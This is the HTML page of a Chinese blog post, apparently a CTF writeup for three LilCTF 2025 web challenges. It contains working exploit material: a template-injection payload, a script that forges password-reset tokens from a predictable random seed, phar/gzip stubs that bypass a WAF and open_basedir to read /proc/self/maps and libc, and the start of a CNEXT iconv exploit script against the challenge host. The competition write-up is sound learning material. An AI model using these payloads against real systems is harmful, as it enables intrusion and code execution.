<!DOCTYPE html>
<html lang="zh" dir="auto" data-theme="dark">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>LilCTF-2025-Web-Writeup | Xrntkk&#39;s Blog</title>
<meta name="keywords" content="writeup, ctf, Web">
<meta name="description" content="这次我们第二名，大家太强了，彦门万岁！

这里是我个人的wp，这次Web我做了5题，所以这里就只写我自己做的题目。
ez_bottle
关键代码
 1@post(&#39;/upload&#39;)
 2def upload():
 3    zip_file = request.files.get(&#39;file&#39;)
 4    if not zip_file or not zip_file.filename.endswith(&#39;.zip&#39;):
 5        return &#39;Invalid file. Please upload a ZIP file.&#39;
 6
 7    if len(zip_file.file.read()) &gt; MAX_FILE_SIZE:
 8        return &#39;File size exceeds 1MB. Please upload a smaller ZIP file.&#39;
 9
10    zip_file.file.seek(0)
11
12    current_time = str(time.time())
13    unique_string = zip_file.filename &#43; current_time
14    md5_hash = hashlib.md5(unique_string.encode()).hexdigest()
15    extract_dir = os.path.join(UPLOAD_DIR, md5_hash)
16    os.makedirs(extract_dir)
17
18    zip_path = os.path.join(extract_dir, &#39;upload.zip&#39;)
19    zip_file.save(zip_path)
20
21    try:
22        with zipfile.ZipFile(zip_path, &#39;r&#39;) as z:
23            for file_info in z.infolist():
24                if is_symlink(file_info):
25                    return &#39;Symbolic links are not allowed.&#39;
26
27                real_dest_path = os.path.realpath(os.path.join(extract_dir, file_info.filename))
28                if not is_safe_path(extract_dir, real_dest_path):
29                    return &#39;Path traversal detected.&#39;
30
31            z.extractall(extract_dir)
32    except zipfile.BadZipFile:
33        return &#39;Invalid ZIP file.&#39;
34
35    files = os.listdir(extract_dir)
36    files.remove(&#39;upload.zip&#39;)
37
38    return template(&#34;文件列表: {{files}}\n访问: /view/{{md5}}/{{first_file}}&#34;,
39                    files=&#34;, &#34;.join(files), md5=md5_hash, first_file=files[0] if files else &#34;nofile&#34;)
40
41@route(&#39;/view/&lt;md5&gt;/&lt;filename&gt;&#39;)
42def view_file(md5, filename):
43    file_path = os.path.join(UPLOAD_DIR, md5, filename)
44    if not os.path.exists(file_path):
45        return &#34;File not found.&#34;
46
47    with open(file_path, &#39;r&#39;, encoding=&#39;utf-8&#39;) as f:
48        content = f.read()
49
50    if contains_blacklist(content):
51        return &#34;you are hacker!!!nonono!!!&#34;
52
53    try:
54        return template(content)
55    except Exception as e:
56        return f&#34;Error rendering template: {str(e)}&#34;
上传一个zip，他会解压并显示文件列表，并且可以查看文件内容">
<meta name="author" content="Xrntkk">
<link rel="canonical" href="https://blog.xrntkk.top/post/lilctf_2025/">

<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
  <meta name="referrer" content="no-referrer-when-downgrade">
<link crossorigin="anonymous" href="/assets/css/stylesheet.317863601f03c2b94974bf53f8aaac583e7d21f7d74106e5602576c147c6f679.css" integrity="sha256-MXhjYB8DwrlJdL9T&#43;KqsWD59IffXQQblYCV2wUfG9nk=" rel="preload stylesheet" as="style">
<link rel="icon" href="https://blog.xrntkk.top/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="https://blog.xrntkk.top/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="https://blog.xrntkk.top/favicon-32x32.png">
<link rel="apple-touch-icon" href="https://blog.xrntkk.top/apple-touch-icon.png">
<link rel="mask-icon" href="https://blog.xrntkk.top/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<link rel="alternate" hreflang="zh" href="https://blog.xrntkk.top/post/lilctf_2025/">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
</noscript><link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,100..800;1,100..800&display=swap" rel="stylesheet">
<meta name="baidu-site-verification" content="codeva-snmPZ4WZk8" /><meta property="og:url" content="https://blog.xrntkk.top/post/lilctf_2025/">
  <meta property="og:site_name" content="Xrntkk&#39;s Blog">
  <meta property="og:title" content="LilCTF-2025-Web-Writeup">
  <meta property="og:description" content="这次我们第二名，大家太强了，彦门万岁！
这里是我个人的wp，这次Web我做了5题，所以这里就只写我自己做的题目。
ez_bottle 关键代码
1@post(&#39;/upload&#39;) 2def upload(): 3 zip_file = request.files.get(&#39;file&#39;) 4 if not zip_file or not zip_file.filename.endswith(&#39;.zip&#39;): 5 return &#39;Invalid file. Please upload a ZIP file.&#39; 6 7 if len(zip_file.file.read()) &gt; MAX_FILE_SIZE: 8 return &#39;File size exceeds 1MB. Please upload a smaller ZIP file.&#39; 9 10 zip_file.file.seek(0) 11 12 current_time = str(time.time()) 13 unique_string = zip_file.filename &#43; current_time 14 md5_hash = hashlib.md5(unique_string.encode()).hexdigest() 15 extract_dir = os.path.join(UPLOAD_DIR, md5_hash) 16 os.makedirs(extract_dir) 17 18 zip_path = os.path.join(extract_dir, &#39;upload.zip&#39;) 19 zip_file.save(zip_path) 20 21 try: 22 with zipfile.ZipFile(zip_path, &#39;r&#39;) as z: 23 for file_info in z.infolist(): 24 if is_symlink(file_info): 25 return &#39;Symbolic links are not allowed.&#39; 26 27 real_dest_path = os.path.realpath(os.path.join(extract_dir, file_info.filename)) 28 if not is_safe_path(extract_dir, real_dest_path): 29 return &#39;Path traversal detected.&#39; 30 31 z.extractall(extract_dir) 32 except zipfile.BadZipFile: 33 return &#39;Invalid ZIP file.&#39; 34 35 files = os.listdir(extract_dir) 36 files.remove(&#39;upload.zip&#39;) 37 38 return template(&#34;文件列表: {{files}}\n访问: /view/{{md5}}/{{first_file}}&#34;, 39 files=&#34;, &#34;.join(files), md5=md5_hash, first_file=files[0] if files else &#34;nofile&#34;) 40 41@route(&#39;/view/&lt;md5&gt;/&lt;filename&gt;&#39;) 42def view_file(md5, filename): 43 file_path = os.path.join(UPLOAD_DIR, md5, filename) 44 if not os.path.exists(file_path): 45 return &#34;File not found.&#34; 46 47 with open(file_path, &#39;r&#39;, encoding=&#39;utf-8&#39;) as f: 48 content = f.read() 49 50 if contains_blacklist(content): 51 return &#34;you are hacker!!!nonono!!!&#34; 52 53 try: 54 return template(content) 55 except Exception as e: 56 return f&#34;Error rendering template: {str(e)}&#34; 上传一个zip，他会解压并显示文件列表，并且可以查看文件内容">
  <meta property="og:locale" content="zh">
  <meta property="og:type" content="article">
    <meta property="article:section" content="post">
    <meta property="article:published_time" content="2025-08-18T18:53:55+08:00">
    <meta property="article:modified_time" content="2025-08-18T18:53:55+08:00">
    <meta property="article:tag" content="Writeup">
    <meta property="article:tag" content="Ctf">
    <meta property="article:tag" content="Web">
      <meta property="og:image" content="https://i.postimg.cc/7hwBy7VS/calcr.png">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://i.postimg.cc/7hwBy7VS/calcr.png">
<meta name="twitter:title" content="LilCTF-2025-Web-Writeup">
<meta name="twitter:description" content="这次我们第二名，大家太强了，彦门万岁！

这里是我个人的wp，这次Web我做了5题，所以这里就只写我自己做的题目。
ez_bottle
关键代码
 1@post(&#39;/upload&#39;)
 2def upload():
 3    zip_file = request.files.get(&#39;file&#39;)
 4    if not zip_file or not zip_file.filename.endswith(&#39;.zip&#39;):
 5        return &#39;Invalid file. Please upload a ZIP file.&#39;
 6
 7    if len(zip_file.file.read()) &gt; MAX_FILE_SIZE:
 8        return &#39;File size exceeds 1MB. Please upload a smaller ZIP file.&#39;
 9
10    zip_file.file.seek(0)
11
12    current_time = str(time.time())
13    unique_string = zip_file.filename &#43; current_time
14    md5_hash = hashlib.md5(unique_string.encode()).hexdigest()
15    extract_dir = os.path.join(UPLOAD_DIR, md5_hash)
16    os.makedirs(extract_dir)
17
18    zip_path = os.path.join(extract_dir, &#39;upload.zip&#39;)
19    zip_file.save(zip_path)
20
21    try:
22        with zipfile.ZipFile(zip_path, &#39;r&#39;) as z:
23            for file_info in z.infolist():
24                if is_symlink(file_info):
25                    return &#39;Symbolic links are not allowed.&#39;
26
27                real_dest_path = os.path.realpath(os.path.join(extract_dir, file_info.filename))
28                if not is_safe_path(extract_dir, real_dest_path):
29                    return &#39;Path traversal detected.&#39;
30
31            z.extractall(extract_dir)
32    except zipfile.BadZipFile:
33        return &#39;Invalid ZIP file.&#39;
34
35    files = os.listdir(extract_dir)
36    files.remove(&#39;upload.zip&#39;)
37
38    return template(&#34;文件列表: {{files}}\n访问: /view/{{md5}}/{{first_file}}&#34;,
39                    files=&#34;, &#34;.join(files), md5=md5_hash, first_file=files[0] if files else &#34;nofile&#34;)
40
41@route(&#39;/view/&lt;md5&gt;/&lt;filename&gt;&#39;)
42def view_file(md5, filename):
43    file_path = os.path.join(UPLOAD_DIR, md5, filename)
44    if not os.path.exists(file_path):
45        return &#34;File not found.&#34;
46
47    with open(file_path, &#39;r&#39;, encoding=&#39;utf-8&#39;) as f:
48        content = f.read()
49
50    if contains_blacklist(content):
51        return &#34;you are hacker!!!nonono!!!&#34;
52
53    try:
54        return template(content)
55    except Exception as e:
56        return f&#34;Error rendering template: {str(e)}&#34;
上传一个zip，他会解压并显示文件列表，并且可以查看文件内容">


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "Posts",
      "item": "https://blog.xrntkk.top/post/"
    }, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "LilCTF-2025-Web-Writeup",
      "item": "https://blog.xrntkk.top/post/lilctf_2025/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "LilCTF-2025-Web-Writeup",
  "name": "LilCTF-2025-Web-Writeup",
  "description": "这次我们第二名，大家太强了，彦门万岁！\n这里是我个人的wp，这次Web我做了5题，所以这里就只写我自己做的题目。\nez_bottle 关键代码\n1@post(\u0026#39;/upload\u0026#39;) 2def upload(): 3 zip_file = request.files.get(\u0026#39;file\u0026#39;) 4 if not zip_file or not zip_file.filename.endswith(\u0026#39;.zip\u0026#39;): 5 return \u0026#39;Invalid file. Please upload a ZIP file.\u0026#39; 6 7 if len(zip_file.file.read()) \u0026gt; MAX_FILE_SIZE: 8 return \u0026#39;File size exceeds 1MB. Please upload a smaller ZIP file.\u0026#39; 9 10 zip_file.file.seek(0) 11 12 current_time = str(time.time()) 13 unique_string = zip_file.filename + current_time 14 md5_hash = hashlib.md5(unique_string.encode()).hexdigest() 15 extract_dir = os.path.join(UPLOAD_DIR, md5_hash) 16 os.makedirs(extract_dir) 17 18 zip_path = os.path.join(extract_dir, \u0026#39;upload.zip\u0026#39;) 19 zip_file.save(zip_path) 20 21 try: 22 with zipfile.ZipFile(zip_path, \u0026#39;r\u0026#39;) as z: 23 for file_info in z.infolist(): 24 if is_symlink(file_info): 25 return \u0026#39;Symbolic links are not allowed.\u0026#39; 26 27 real_dest_path = os.path.realpath(os.path.join(extract_dir, file_info.filename)) 28 if not is_safe_path(extract_dir, real_dest_path): 29 return \u0026#39;Path traversal detected.\u0026#39; 30 31 z.extractall(extract_dir) 32 except zipfile.BadZipFile: 33 return \u0026#39;Invalid ZIP file.\u0026#39; 34 35 files = os.listdir(extract_dir) 36 files.remove(\u0026#39;upload.zip\u0026#39;) 37 38 return template(\u0026#34;文件列表: {{files}}\\n访问: /view/{{md5}}/{{first_file}}\u0026#34;, 39 files=\u0026#34;, \u0026#34;.join(files), md5=md5_hash, first_file=files[0] if files else \u0026#34;nofile\u0026#34;) 40 41@route(\u0026#39;/view/\u0026lt;md5\u0026gt;/\u0026lt;filename\u0026gt;\u0026#39;) 42def view_file(md5, filename): 43 file_path = os.path.join(UPLOAD_DIR, md5, filename) 44 if not os.path.exists(file_path): 45 return \u0026#34;File not found.\u0026#34; 46 47 with open(file_path, \u0026#39;r\u0026#39;, encoding=\u0026#39;utf-8\u0026#39;) as f: 48 content = f.read() 49 50 if contains_blacklist(content): 51 return \u0026#34;you are hacker!!!nonono!!!\u0026#34; 52 53 try: 54 return template(content) 55 except Exception as e: 56 return f\u0026#34;Error rendering template: {str(e)}\u0026#34; 上传一个zip，他会解压并显示文件列表，并且可以查看文件内容\n",
  "keywords": [
    "writeup", "ctf", "Web"
  ],
  "articleBody": "这次我们第二名，大家太强了，彦门万岁！\n这里是我个人的wp，这次Web我做了5题，所以这里就只写我自己做的题目。\nez_bottle 关键代码\n1@post('/upload') 2def upload(): 3 zip_file = request.files.get('file') 4 if not zip_file or not zip_file.filename.endswith('.zip'): 5 return 'Invalid file. Please upload a ZIP file.' 6 7 if len(zip_file.file.read()) \u003e MAX_FILE_SIZE: 8 return 'File size exceeds 1MB. Please upload a smaller ZIP file.' 9 10 zip_file.file.seek(0) 11 12 current_time = str(time.time()) 13 unique_string = zip_file.filename + current_time 14 md5_hash = hashlib.md5(unique_string.encode()).hexdigest() 15 extract_dir = os.path.join(UPLOAD_DIR, md5_hash) 16 os.makedirs(extract_dir) 17 18 zip_path = os.path.join(extract_dir, 'upload.zip') 19 zip_file.save(zip_path) 20 21 try: 22 with zipfile.ZipFile(zip_path, 'r') as z: 23 for file_info in z.infolist(): 24 if is_symlink(file_info): 25 return 'Symbolic links are not allowed.' 26 27 real_dest_path = os.path.realpath(os.path.join(extract_dir, file_info.filename)) 28 if not is_safe_path(extract_dir, real_dest_path): 29 return 'Path traversal detected.' 30 31 z.extractall(extract_dir) 32 except zipfile.BadZipFile: 33 return 'Invalid ZIP file.' 34 35 files = os.listdir(extract_dir) 36 files.remove('upload.zip') 37 38 return template(\"文件列表: {{files}}\\n访问: /view/{{md5}}/{{first_file}}\", 39 files=\", \".join(files), md5=md5_hash, first_file=files[0] if files else \"nofile\") 40 41@route('/view//') 42def view_file(md5, filename): 43 file_path = os.path.join(UPLOAD_DIR, md5, filename) 44 if not os.path.exists(file_path): 45 return \"File not found.\" 46 47 with open(file_path, 'r', encoding='utf-8') as f: 48 content = f.read() 49 50 if contains_blacklist(content): 51 return \"you are hacker!!!nonono!!!\" 52 53 try: 54 return template(content) 55 except Exception as e: 56 return f\"Error rendering template: {str(e)}\" 上传一个zip，他会解压并显示文件列表，并且可以查看文件内容\n打 SimpleTemplate 模板渲染，直接把flag复制到静态目录\n1% import shutil;shutil.copy('/flag', 'static/flag') 2% end 访问带有payload的文件，代码执行拿到flag\nEkko_note 源码\n1# -*- encoding: utf-8 -*- 2''' 3@File : app.py 4@Time : 2066/07/05 19:20:29 5@Author : Ekko exec inc. 某牛马程序员 6''' 7import os 8import time 9import uuid 10import requests 11 12from functools import wraps 13from datetime import datetime 14from secrets import token_urlsafe 15from flask_sqlalchemy import SQLAlchemy 16from werkzeug.security import generate_password_hash, check_password_hash 17from flask import Flask, render_template, redirect, url_for, request, flash, session 18 19SERVER_START_TIME = time.time() 20 21# 欸我艹这两行代码测试用的忘记删了，欸算了都发布了，我们都在用力地活着，跟我的下班说去吧。 22# 反正整个程序没有一个地方用到random库。应该没有什么问题。 23import random 24random.seed(SERVER_START_TIME) 25 26admin_super_strong_password = token_urlsafe() 27app = Flask(__name__) 28app.config['SECRET_KEY'] = 'your-secret-key-here' 29app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///site.db' 30app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False 31 32db = SQLAlchemy(app) 33 34class User(db.Model): 35 id = db.Column(db.Integer, primary_key=True) 36 username = db.Column(db.String(20), unique=True, nullable=False) 37 email = db.Column(db.String(120), unique=True, nullable=False) 38 password = db.Column(db.String(60), nullable=False) 39 is_admin = db.Column(db.Boolean, default=False) 40 time_api = db.Column(db.String(200), default='https://api.uuni.cn//api/time') 41 42class PasswordResetToken(db.Model): 43 id = db.Column(db.Integer, primary_key=True) 44 user_id = db.Column(db.Integer, db.ForeignKey('user.id'), nullable=False) 45 token = db.Column(db.String(36), unique=True, nullable=False) 46 used = db.Column(db.Boolean, default=False) 47 48def padding(input_string): 49 byte_string = input_string.encode('utf-8') 50 if len(byte_string) \u003e 6: byte_string = byte_string[:6] 51 padded_byte_string = byte_string.ljust(6, b'\\x00') 52 padded_int = int.from_bytes(padded_byte_string, byteorder='big') 53 return padded_int 54 55with app.app_context(): 56 db.create_all() 57 if not User.query.filter_by(username='admin').first(): 58 admin = User( 59 username='admin', 60 email='admin@example.com', 61 password=generate_password_hash(admin_super_strong_password), 62 is_admin=True 63 ) 64 db.session.add(admin) 65 db.session.commit() 66 67def login_required(f): 68 @wraps(f) 69 def decorated_function(*args, **kwargs): 70 if 'user_id' not in session: 71 flash('请登录', 'danger') 72 return redirect(url_for('login')) 73 return f(*args, **kwargs) 74 return decorated_function 75 76def admin_required(f): 77 @wraps(f) 78 def decorated_function(*args, **kwargs): 79 if 'user_id' not in session: 80 flash('请登录', 'danger') 81 return redirect(url_for('login')) 82 user = User.query.get(session['user_id']) 83 if not user.is_admin: 84 flash('你不是admin', 'danger') 85 return redirect(url_for('home')) 86 return f(*args, **kwargs) 87 return decorated_function 88 89def check_time_api(): 90 user = User.query.get(session['user_id']) 91 try: 92 response = requests.get(user.time_api) 93 data = response.json() 94 datetime_str = data.get('date') 95 if datetime_str: 96 print(datetime_str) 97 current_time = datetime.fromisoformat(datetime_str) 98 return current_time.year \u003e= 2066 99 except Exception as e: 100 return None 101 return None 102@app.route('/') 103def home(): 104 return render_template('home.html') 105 106@app.route('/server_info') 107@login_required 108def server_info(): 109 return { 110 'server_start_time': SERVER_START_TIME, 111 'current_time': time.time() 112 } 113@app.route('/register', methods=['GET', 'POST']) 114def register(): 115 if request.method == 'POST': 116 username = request.form.get('username') 117 email = request.form.get('email') 118 password = request.form.get('password') 119 confirm_password = request.form.get('confirm_password') 120 121 if password != confirm_password: 122 flash('密码错误', 'danger') 123 return redirect(url_for('register')) 124 125 existing_user = User.query.filter_by(username=username).first() 126 if existing_user: 127 flash('已经存在这个用户了', 'danger') 128 return redirect(url_for('register')) 129 130 existing_email = User.query.filter_by(email=email).first() 131 if existing_email: 132 flash('这个邮箱已经被注册了', 'danger') 133 return redirect(url_for('register')) 134 135 hashed_password = generate_password_hash(password) 136 new_user = User(username=username, email=email, password=hashed_password) 137 db.session.add(new_user) 138 db.session.commit() 139 140 flash('注册成功，请登录', 'success') 141 return redirect(url_for('login')) 142 143 return render_template('register.html') 144 145@app.route('/login', methods=['GET', 'POST']) 146def login(): 147 if request.method == 'POST': 148 username = request.form.get('username') 149 password = request.form.get('password') 150 151 user = User.query.filter_by(username=username).first() 152 if user and check_password_hash(user.password, password): 153 session['user_id'] = user.id 154 session['username'] = user.username 155 session['is_admin'] = user.is_admin 156 flash('登陆成功，欢迎!', 'success') 157 return redirect(url_for('dashboard')) 158 else: 159 flash('用户名或密码错误!', 'danger') 160 return redirect(url_for('login')) 161 162 return render_template('login.html') 163 164@app.route('/logout') 165@login_required 166def logout(): 167 session.clear() 168 flash('成功登出', 'info') 169 return redirect(url_for('home')) 170 171@app.route('/dashboard') 172@login_required 173def dashboard(): 174 return render_template('dashboard.html') 175 176@app.route('/forgot_password', methods=['GET', 'POST']) 177def forgot_password(): 178 if request.method == 'POST': 179 email = request.form.get('email') 180 user = User.query.filter_by(email=email).first() 181 if user: 182 # 选哪个UUID版本好呢，好头疼 \u003e_\u003c 183 # UUID v8吧，看起来版本比较新 184 token = str(uuid.uuid8(a=padding(user.username))) # 可以自定义参数吗原来，那把username放进去吧 185 reset_token = PasswordResetToken(user_id=user.id, token=token) 186 db.session.add(reset_token) 187 db.session.commit() 188 # TODO：写一个SMTP服务把token发出去 189 flash(f'密码恢复token已经发送，请检查你的邮箱', 'info') 190 return redirect(url_for('reset_password')) 191 else: 192 flash('没有找到该邮箱对应的注册账户', 'danger') 193 return redirect(url_for('forgot_password')) 194 195 return render_template('forgot_password.html') 196 197@app.route('/reset_password', methods=['GET', 'POST']) 198def reset_password(): 199 if request.method == 'POST': 200 token = request.form.get('token') 201 new_password = request.form.get('new_password') 202 confirm_password = request.form.get('confirm_password') 203 204 if new_password != confirm_password: 205 flash('密码不匹配', 'danger') 206 return redirect(url_for('reset_password')) 207 208 reset_token = PasswordResetToken.query.filter_by(token=token, used=False).first() 209 if reset_token: 210 user = User.query.get(reset_token.user_id) 211 user.password = generate_password_hash(new_password) 212 reset_token.used = True 213 db.session.commit() 214 flash('成功重置密码！请重新登录', 'success') 215 return redirect(url_for('login')) 216 else: 217 flash('无效或过期的token', 'danger') 218 return redirect(url_for('reset_password')) 219 220 return render_template('reset_password.html') 221 222@app.route('/execute_command', methods=['GET', 'POST']) 223@login_required 224def execute_command(): 225 result = check_time_api() 226 if result is None: 227 flash(\"API死了啦，都你害的啦。\", \"danger\") 228 return redirect(url_for('dashboard')) 229 230 if not result: 231 flash('2066年才完工哈，你可以穿越到2066年看看', 'danger') 232 return redirect(url_for('dashboard')) 233 234 if request.method == 'POST': 235 command = request.form.get('command') 236 os.system(command) # 什么？你说安全？不是，都说了还没完工催什么。 237 return redirect(url_for('execute_command')) 238 239 return render_template('execute_command.html') 240 241@app.route('/admin/settings', methods=['GET', 'POST']) 242@admin_required 243def admin_settings(): 244 user = User.query.get(session['user_id']) 245 246 if request.method == 'POST': 247 new_api = request.form.get('time_api') 248 user.time_api = new_api 249 db.session.commit() 250 flash('成功更新API！', 'success') 251 return redirect(url_for('admin_settings')) 252 253 return render_template('admin_settings.html', time_api=user.time_api) 254 255if __name__ == '__main__': 256 app.run(debug=False, host=\"0.0.0.0\") 一开始发现我的uuid没有uuid8，感觉是版本问题，刚好在出题人博客看到了uuidv8的实现，就直接拿来用了\n1def uuid8(a=None, b=None, c=None): 2 \"\"\"Generate a UUID from three custom blocks. 3 4 * 'a' is the first 48-bit chunk of the UUID (octets 0-5); 5 * 'b' is the mid 12-bit chunk (octets 6-7); 6 * 'c' is the last 62-bit chunk (octets 8-15). 7 8 When a value is not specified, a pseudo-random value is generated. 9 \"\"\" 10 if a is None: 11 a = random.getrandbits(48) 12 if b is None: 13 b = random.getrandbits(12) 14 if c is None: 15 c = random.getrandbits(62) 16 17 int_uuid_8 = (a \u0026 0xffff_ffff_ffff) \u003c\u003c 80 18 int_uuid_8 |= (b \u0026 0xfff) \u003c\u003c 64 19 int_uuid_8 |= c \u0026 0x3fff_ffff_ffff_ffff 20 # Set version and variant flags 21 int_uuid_8 |= (8 \u003c\u003c 76) # Version 8 22 int_uuid_8 |= (0x02 \u003c\u003c 62) # Variant 10xx (RFC4122) 23 24 return uuid.UUID(int=int_uuid_8) 在源码中token的生成是在a位置传入username，b，c为空，但是我们可以看到b，c处生成的是伪随机数，种子是固定的，是程序的启动时间，我们可以在/server_info拿到。接下来就是伪造token去改admin密码。\n生成token\n1import random 2import uuid 3 4SERVER_START_TIME = 1755353838.0696628 5random.seed(SERVER_START_TIME) 6 7def padding(input_string): 8 byte_string = input_string.encode('utf-8') 9 if len(byte_string) \u003e 6: byte_string = byte_string[:6] 10 padded_byte_string = byte_string.ljust(6, b'\\x00') 11 padded_int = int.from_bytes(padded_byte_string, byteorder='big') 12 return padded_int 13 14def uuid8(a=None, b=None, c=None): 15 \"\"\"Generate a UUID from three custom blocks. 16 17 * 'a' is the first 48-bit chunk of the UUID (octets 0-5); 18 * 'b' is the mid 12-bit chunk (octets 6-7); 19 * 'c' is the last 62-bit chunk (octets 8-15). 20 21 When a value is not specified, a pseudo-random value is generated. 22 \"\"\" 23 if a is None: 24 a = random.getrandbits(48) 25 if b is None: 26 b = random.getrandbits(12) 27 if c is None: 28 c = random.getrandbits(62) 29 30 int_uuid_8 = (a \u0026 0xffff_ffff_ffff) \u003c\u003c 80 31 int_uuid_8 |= (b \u0026 0xfff) \u003c\u003c 64 32 int_uuid_8 |= c \u0026 0x3fff_ffff_ffff_ffff 33 # Set version and variant flags 34 int_uuid_8 |= (8 \u003c\u003c 76) # Version 8 35 int_uuid_8 |= (0x02 \u003c\u003c 62) # Variant 10xx (RFC4122) 36 37 return uuid.UUID(int=int_uuid_8) 38 39token = str(uuid8(a=padding(\"admin\"))) 40print(token) 在远端也生成一下token\n成功修改密码\n/execute_command 会从设置的时间api获取时间\n获取的时间大于2066年才可以命令执行\n1from flask import Flask, jsonify 2 3app = Flask(__name__) 4 5@app.route(\"/\") 6def fake_time(): 7 return jsonify({ 8 \"date\": \"2067-01-01T12:00:00\" 9 }) 10 11if __name__ == \"__main__\": 12 app.run(host='0.0.0.0' ,port=5006) vps起个服务\n命令执行没回显，flag写静态目录\nphp_jail_is_my_cry 1if (isset($_GET['down'])){ 2 include '/tmp/' . basename($_GET['down']); 3 exit; 4} 5 6// 上传文件 7if (isset($_FILES['file'])) { 8 $target_dir = \"/tmp/\"; 9 $target_file = $target_dir . basename($_FILES[\"file\"][\"name\"]); 10 $orig = $_FILES[\"file\"][\"tmp_name\"]; 11 $ch = curl_init('file://'. $orig); 12 13 // I hide a trick to bypass open_basedir, I'm sure you can find it. 14 15 curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); 16 $data = curl_exec($ch); 17 curl_close($ch); 18 if (stripos($data, '\u003c?') === false \u0026\u0026 stripos($data, 'php') === false \u0026\u0026 stripos($data, 'halt') === false) { 19 file_put_contents($target_file, $data); 20 } else { 21 echo \"存在 `\u003c?` 或者 `php` 或者 `halt` 恶意字符!\"; 22 $data = null; 23 } 24} 这里可以文件上传，而且可以包含tmp目录下的文件，但是文件上传有waf，不能有\u003c?` 或者 `php` 或者 `halt。这里还有个提示说藏了个绕过open_basedir的trick，后面会用到。\n前面这个跟 DeadsecCTF2025 的一道web题很像，利用了include 的一个trick，我们可以将phar文件压缩后再include，php会根据不同类型的压缩包对其进行解压后再当成phar解析。利用这个，我们就可以绕过waf，文件包含代码执行了。\n1\u003c?php 2$phar = new Phar('exploit.phar'); 3$phar-\u003estartBuffering(); 4 5$stub = \u003c\u003c\u003c 'STUB' 6\u003c?php 7 phpinfo(); 8 __HALT_COMPILER(); 9?\u003e 10STUB; 11 12$phar-\u003esetStub($stub); 13 14$phar-\u003eaddFromString('test.txt', 'test'); 15 16$phar-\u003estopBuffering(); 17?\u003e 压缩成gz文件\n成功执行\n但是由于disable_functions和disable_classes写的很死，没办法直接命令执行。\n后面留意到了iconv的版本，发现小于2.39，可以打cnext\n打cnext首先得拿maps和libc，由于open_basedir，我们只能读/var/www/html和/tmp\n但是绕过open_basedir的方法题目源码给出来了，所以先读个源码\n1\u003c?php 2if (isset($_POST['url'])) { 3 $url = $_POST['url']; 4 $file_name = basename($url); 5 6 $ch = curl_init($url); 7 curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); 8 $data = curl_exec($ch); 9 curl_close($ch); 10 11 if ($data) { 12 file_put_contents('/tmp/'.$file_name, $data); 13 echo \"文件已下载: $file_name\"; 14 } else { 15 echo \"下载失败。\"; 16 } 17} 18 19if (isset($_GET['down'])){ 20 include '/tmp/' . basename($_GET['down']); 21 exit; 22} 23 24// 上传文件 25if (isset($_FILES['file'])) { 26 $target_dir = \"/tmp/\"; 27 $target_file = $target_dir . basename($_FILES[\"file\"][\"name\"]); 28 $orig = $_FILES[\"file\"][\"tmp_name\"]; 29 $ch = curl_init('file://'. $orig); 30 curl_setopt($ch, CURLOPT_PROTOCOLS_STR, \"all\"); // secret trick to bypass, omg why will i show it to you! 31 curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); 32 $data = curl_exec($ch); 33 curl_close($ch); 34 if (stripos($data, '\u003c?') === false \u0026\u0026 stripos($data, 'php') === false \u0026\u0026 stripos($data, 'halt') === false) { 35 file_put_contents($target_file, $data); 36 } else { 37 echo \"存在 `\u003c?` 或者 `php` 或者 `halt` 恶意字符!\"; 38 $data = null; 39 } 40} 41?\u003e 利用这个方法把maps和libc写到web目录\nmaps\n1\u003c?php 2$phar = new Phar('maps.phar'); 3$phar-\u003estartBuffering(); 4 5$stub = \u003c\u003c\u003c 'STUB' 6\u003c?php 7 $ch = curl_init('file:///proc/self/maps'); 8 curl_setopt($ch, CURLOPT_PROTOCOLS_STR, \"all\"); 9 curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); 10 $data = curl_exec($ch); 11 curl_close($ch); 12 file_put_contents(\"/var/www/html/maps\", $data); 13 __HALT_COMPILER(); 14?\u003e 15STUB; 16 17$phar-\u003esetStub($stub); 18 19$phar-\u003eaddFromString('test.txt', 'test'); 20 21$phar-\u003estopBuffering(); 22?\u003e libc\n1\u003c?php 2$phar = new Phar('libc.phar'); 3$phar-\u003estartBuffering(); 4 5$stub = \u003c\u003c\u003c 'STUB' 6\u003c?php 7 $ch = curl_init('file:///usr/lib/x86_64-linux-gnu/libc.so.6'); 8 curl_setopt($ch, CURLOPT_PROTOCOLS_STR, \"all\"); 9 curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); 10 $data = curl_exec($ch); 11 curl_close($ch); 12 file_put_contents(\"/var/www/html/libc\", $data); 13 __HALT_COMPILER(); 14?\u003e 15STUB; 16 17$phar-\u003esetStub($stub); 18 19$phar-\u003eaddFromString('test.txt', 'test'); 20 21$phar-\u003estopBuffering(); 22?\u003e 生成payload\n1import requests 2import re 3from ten import * 4from pwn import * 5from dataclasses import dataclass 6from base64 import * 7import zlib 8from urllib.parse import quote 9 10HEAP_SIZE = 2 * 1024 * 1024 11BUG = \"劄\".encode(\"utf-8\") 12 13url = \"http://challenge.xinshi.fun:40793\" 14command: str = \"/readflag \u003e /var/www/html/flag;\" 15sleep: int = 1 16PAD: int = 20 17pad: int = 20 18info = {} 19heap = 0 20 21@dataclass 22class Region: 23 \"\"\"A memory region.\"\"\" 24 25 